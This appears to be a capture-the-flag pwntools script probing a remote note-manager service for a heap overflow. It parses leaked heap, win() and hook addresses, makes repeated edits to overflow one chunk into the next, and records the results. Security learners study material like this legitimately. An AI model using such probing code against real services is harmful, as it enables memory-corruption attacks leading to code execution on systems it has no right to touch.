#!/usr/bin/env python3
from pwn import *
import json, os

context.log_level = 'error'
context.arch = 'amd64'

HOST = '212.2.250.33'
PORT = 31185
OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'results2.json')

results = {}
io = remote(HOST, PORT, timeout=10)

banner = io.recvuntil(b'> ')
results['banner'] = banner.decode(errors='replace')

# Parse addresses
import re
heap = int(re.search(r'heap @ (0x[0-9a-f]+)', results['banner']).group(1), 16)
win = int(re.search(r'win\(\)\s+@ (0x[0-9a-f]+)', results['banner']).group(1), 16)
hook = int(re.search(r'hook\s+@ (0x[0-9a-f]+)', results['banner']).group(1), 16)
results['addrs'] = f"heap={hex(heap)}, win={hex(win)}, hook={hex(hook)}"

def menu():
    io.recvuntil(b'> ')

def create(size, content):
    menu()
    io.sendline(b'1')
    io.recvuntil(b':')
    io.sendline(str(size).encode())
    io.recvuntil(b':')
    io.send(content)  # use send, not sendline, for binary data

def edit(idx, content):
    menu()
    io.sendline(b'2')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())
    io.recvuntil(b':')
    io.send(content)  # use send for binary data

def delete(idx):
    menu()
    io.sendline(b'3')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())

def print_note(idx):
    menu()
    io.sendline(b'4')
    io.recvuntil(b':')
    io.sendline(str(idx).encode())

# Test: use send() instead of sendline() to control exact bytes
# Create note 0 with exactly 24 bytes (0x18), filling the chunk
create(0x18, b'A' * 0x18 + b'\n')  # 0x18 A's + newline to terminate input

# Create note 1 with 24 bytes
create(0x18, b'B' * 0x18 + b'\n')

# Create note 2 (guard)
create(0x18, b'C' * 0x18 + b'\n')

# Print note 1 before any edits
print_note(1)
resp = io.recvuntil(b'1) Create')
results['note1_before'] = resp.decode(errors='replace').replace('\n', '|')

# Now do repeated edits on note 0 to overflow into note 1
# Each edit appends 1 byte + newline
# We want to overwrite note 1's chunk header and data
for i in range(20):
    edit(0, bytes([0x41 + i]) + b'\n')

# Print note 0 to see how big it grew
print_note(0)
resp = io.recvuntil(b'1) Create')
results['note0_after_edits'] = resp.decode(errors='replace').replace('\n', '|')

# Print note 1 to see if it's corrupted
print_note(1)
resp = io.recvuntil(b'1) Create')
results['note1_after_edits'] = resp.decode(errors='replace').replace('\n', '|')

io.close()

with open(OUTFILE, 'w') as f:
    json.dump(results, f, indent=2)
print(f"DONE: {OUTFILE}")
